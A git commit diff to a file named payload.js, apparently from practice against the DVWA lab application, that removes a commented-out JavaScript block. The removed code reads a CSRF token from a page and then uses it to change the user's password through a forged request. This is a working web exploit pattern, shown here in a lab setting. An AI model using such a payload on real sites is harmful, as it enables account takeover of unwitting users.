308b3b8092a20c86f7b6ed99490790b040331339
Hamza Khalid <36852564+hmzakhalid@users.noreply.github.com>
2022-11-28 18:04:50 +0500

    Update payload.js

--- payload.js
+++ payload.js
@@ -25,34 +25,3 @@ fetch(theUrl, {
         console.log(text);
     });
 });
-
-
-
-
-
-// if (window.XMLHttpRequest){
-//     xmlhttp=new XMLHttpRequest();
-// }else{
-//     xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-// }
-// xmlhttp.withCredentials = true;
-// var hacked = false;
-// xmlhttp.onreadystatechange=function(){
-//     if (xmlhttp.readyState==4 && xmlhttp.status==200)
-//     {
-//         var text = xmlhttp.responseText;
-//         var regex = /user_token\' value\=\'(.*?)\' \/\>/;
-//         var match = text.match(regex);
-//         var token = match[1];
-//         var new_url = 'http://localhost/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
-//         if(!hacked){
-//             alert('Got token:' + match[1]);
-//             hacked = true;
-//             xmlhttp.open("GET", new_url, false );
-//             xmlhttp.send();  
-//         }
-//         count++;
-//     }
-// };
-// xmlhttp.open("GET", theUrl, false );
-// xmlhttp.send();  
